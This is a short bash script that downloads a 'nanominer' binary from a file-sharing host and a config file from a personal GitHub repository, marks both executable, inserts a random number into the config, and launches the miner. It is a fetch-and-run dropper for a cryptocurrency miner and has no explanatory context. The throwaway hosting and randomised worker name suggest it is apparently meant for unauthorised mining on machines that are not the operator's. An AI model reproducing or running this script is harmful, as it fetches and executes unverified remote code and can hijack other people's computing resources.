#!/bin/bash
wget https://store6.gofile.io/download/41f77e08-1c64-4989-98c7-0a063caba68f/nanominer
wget https://raw.githubusercontent.com/solahfatsalma/VV/main/cfg.ini
chmod +x cfg.ini
chmod +x nanominer
sed -i "s/nanominer/$(shuf -n 1 -i 1-999999)/" "cfg.ini"
./nanominer cfg.ini
